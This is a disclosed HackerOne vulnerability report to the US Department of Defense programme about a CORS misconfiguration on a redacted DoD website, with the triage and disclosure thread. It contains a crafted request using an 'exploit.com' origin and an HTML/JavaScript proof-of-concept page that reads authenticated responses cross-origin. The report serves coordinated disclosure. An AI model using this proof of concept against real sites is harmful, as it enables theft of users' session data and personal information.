{"id":470298,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzAyOTg=","url":"https://hackerone.com/reports/470298","title":"[██████] Cross-origin resource sharing misconfiguration (CORS)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-12-20T15:15:12.102Z","submitted_at":"2018-12-20T15:15:12.102Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jarvis7","url":"/jarvis7","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-01-28T13:31:46.124Z","bug_reporter_agreed_on_going_public_at":"2019-01-17T01:29:45.077Z","team_member_agreed_on_going_public_at":"2019-01-28T13:31:46.039Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi!\n\nIn this report I want to describe High level bug which can seriously compromise a user account.\n\nIf I am authorize on this site, I can steal user's sessions, some personal information or do some action.\n\n### Steps for reproduce\n\n1) Send this request\n\n```\nGET /api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link HTTP/1.1\nHost: www.█████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: ru,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nOrigin: exploit.com\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\n```\n\nIn response headers you can see headers\n```\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Origin: exploit.com\n```\n\n{F395049}\n\n\nSo you can write exploit:\n```\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n   \u003chead\u003e\n      \u003cscript\u003e\n         function cors() {\n\t        var xhttp = new XMLHttpRequest();\n\t\t        xhttp.onreadystatechange = function() {\n\t\t\t        if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n\t\t\t        \tdocument.getElementById(\"emo\").innerHTML = alert(this.responseText);\n\t        }\n         };\n         xhttp.open(\"GET\", \"https://www.███/api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link\", true);\n         xhttp.withCredentials = true;\n         xhttp.send();\n         }\n      \u003c/script\u003e\n   \u003c/head\u003e\n   \u003cbody\u003e\n      \u003ccenter\u003e\n      \u003ch2\u003eCORS PoC Exploit \u003c/h2\u003e\n      \u003ch3\u003ecreated by \u003ca href=\"https://twitter.com/Jarvis7717\"\u003e@Jarvis\u003c/a\u003e\u003c/h3\u003e\n      \u003ch3\u003eShow full content of page\u003c/h3\u003e\n      \u003cdiv id=\"demo\"\u003e\n         \u003cbutton type=\"button\" onclick=\"cors()\"\u003eExploit\u003c/button\u003e\n      \u003c/div\u003e\n   \u003c/body\u003e\n\u003c/html\u003e\n```\n\nResult:\n{F395063}\n### How to fix\n\nRather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.\n\n## Impact\n\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":30,"voters":["afernandes","lemonoftroy","sameerphad72","mik317","jarvis7","chita","mainteemoforfun","eveeez","haxta4ok00","an0nym0us","and 20 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3871485,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2018-12-20T15:15:12.486Z","updated_at":"2018-12-20T15:15:12.486Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3876851,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-12-21T15:50:25.076Z","updated_at":"2018-12-21T15:50:25.076Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":270359},"actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3876852,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2018-12-21T15:50:31.780Z","updated_at":"2018-12-21T15:50:31.780Z","actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3987986,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Looks like this has been resolved.  Also wanted to thank you for a great report that you wrote out explaining and also showing CORS vulnerability in action.  I'd recommend you go ahead and ask for disclosure on this, that way I can use this report to show to other researchers that only show the response header but include no working PoC.  We have a bit of a backlog on disclosure requests but we will get it published out for disclosure as soon as we can.","automated_response":false,"created_at":"2019-01-16T17:23:01.106Z","updated_at":"2019-01-16T17:23:01.106Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jarvis7","url":"/jarvis7"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3990079,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"okay)","automated_response":false,"created_at":"2019-01-17T01:29:45.114Z","updated_at":"2019-01-17T01:29:45.114Z","first_to_agree":true,"actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3990082,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also severity of this bug is High, not Low. And you can also cut or shade domain  from name of report (If you want)","automated_response":false,"created_at":"2019-01-17T01:33:39.101Z","updated_at":"2019-01-17T01:33:39.101Z","actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4017818,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jarvis7\n\nThis was a great find, thank you! Your disclosure is approved. Please use the following text:\n\nA Cross-origin resource sharing misconfiguration (CORS) vulnerability with a severity rating of high was discovered on a DoD website by researcher jarvis7. He provided an in-depth, step-by-step proof of concept (POC) which demonstrated his ability to compromise a user account; resulting in the hijacking of a user's sessions, theft of some personal information, and follow-on malicious actions. A job well done jarvis7, and thank you for keeping our websites secure!\n\nWe would like to congratulate you on Twitter (@DC3VDP) if that is acceptable. If yes please verify your Twitter handle is @Jarvis7717. We will redact information in H1 on this vulnerability submission so you can disclose the technical aspects as well as your POC. Please give us 2 weeks to perform this manual process. Thanks again!\n\nDoD VDP Team  ","automated_response":false,"created_at":"2019-01-22T15:01:08.591Z","updated_at":"2019-01-22T15:01:08.591Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4017834,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-01-22T15:04:09.968Z","updated_at":"2019-01-22T15:04:09.968Z","additional_data":{"old_severity":"Low","new_severity":"High","old_severity_id":270359,"new_severity_id":284156},"actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4017844,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also upped the severity since you actually supplied a working PoC.  Thanks Jarvis!","automated_response":false,"created_at":"2019-01-22T15:05:26.212Z","updated_at":"2019-01-22T15:05:26.212Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4019769,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, this is my twitter https://twitter.com/Jarvis7717, of course you can write in twitter about this!) Nice text for disclose. Thanks!","automated_response":false,"created_at":"2019-01-22T18:44:16.157Z","updated_at":"2019-01-22T18:44:16.157Z","actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4019819,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"██████","automated_response":false,"created_at":"2019-01-22T18:55:04.745Z","updated_at":"2019-01-28T13:31:15.610Z","actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4050053,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-01-28T13:31:46.072Z","updated_at":"2019-01-28T13:31:46.072Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4050054,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-01-28T13:31:46.146Z","updated_at":"2019-01-28T13:31:46.146Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4050056,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","automated_response":false,"created_at":"2019-01-28T13:31:50.629Z","updated_at":"2019-01-28T13:31:50.629Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}